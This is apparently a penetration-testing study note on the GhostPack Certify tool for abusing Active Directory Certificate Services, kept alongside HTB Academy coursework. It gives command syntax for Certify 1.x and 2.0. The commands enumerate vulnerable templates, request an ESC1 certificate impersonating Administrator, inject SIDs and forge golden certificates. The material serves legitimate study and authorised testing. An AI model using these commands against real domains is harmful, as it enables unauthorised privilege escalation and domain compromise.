# Certify

**Tags:** `#certify` `#adcs` `#activedirectory` `#certificateservices` `#esc` `#privesc` `#dotnet` `#ghostpack`

Windows C# tool (GhostPack) for enumerating and abusing Active Directory Certificate Services (AD CS) misconfigurations — the .NET/on-host counterpart to [[Tools/AD/Certipy|Certipy]]. Enumerates CAs and certificate templates, flags vulnerable configurations (ESC1/ESC2/ESC6 patterns), and requests certificates on behalf of the current or a specified user. Commonly paired with [[Tools/Lateral Movement/Rubeus|Rubeus]] to convert the resulting certificate into a usable Kerberos ticket.

**Source:** https://github.com/GhostPack/Certify
**Install:** build from source with Visual Studio/`msbuild`, or drop a prebuilt binary — no package manager distribution.

> [!warning] **Two incompatible command syntaxes — check your version first (`.\Certify.exe` prints the banner + version).** The GhostPack repo was **rewritten as Certify 2.0**, which replaces the classic `verb /arg:val` syntax with **subcommands + POSIX `--flags`**. Countless binaries and writeups still use **1.x**, so both are below. `/altname:` is gone in 2.0 — the SAN is set with explicit `--upn` / `--dns` / `--sid`.

```powershell
# ---- Certify 1.x (classic — the binary in most writeups) ----
.\Certify.exe cas                                   # enumerate CAs
.\Certify.exe find                                  # all templates
.\Certify.exe find /vulnerable
.\Certify.exe find /vulnerable /currentuser
# Request a cert with an alternate SAN (ESC1-style)
.\Certify.exe request /ca:<domain>\<CA_Name> /template:<Template> /altname:Administrator
```

```powershell
# ---- Certify 2.0 (current main branch) — same actions, new grammar ----
.\Certify.exe enum-cas                              # was: cas
.\Certify.exe enum-templates                        # was: find
.\Certify.exe enum-templates --filter-vulnerable    # was: find /vulnerable
.\Certify.exe enum-templates --filter-vulnerable --current-user
# ESC1 request — SAN via --upn (there is no --altname in 2.0)
.\Certify.exe request --ca <domain>\<CA_Name> --template <Template> --upn administrator@<domain>
# ESC9/ESC10 SID injection and golden-cert forging also live here:
.\Certify.exe request --ca <domain>\<CA_Name> --template <Template> --upn administrator@<domain> --sid <target-SID>
.\Certify.exe forge --ca-cert CA.pfx --ca-pass <pw> --upn administrator@<domain> --subject 'CN=Administrator,...'
```

> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] for the full ESC1–ESC16 attack methodology this tool is used against. Also [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — AD CS enumeration and abuse from a Windows host.

---

*Created: 2026-07-27*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
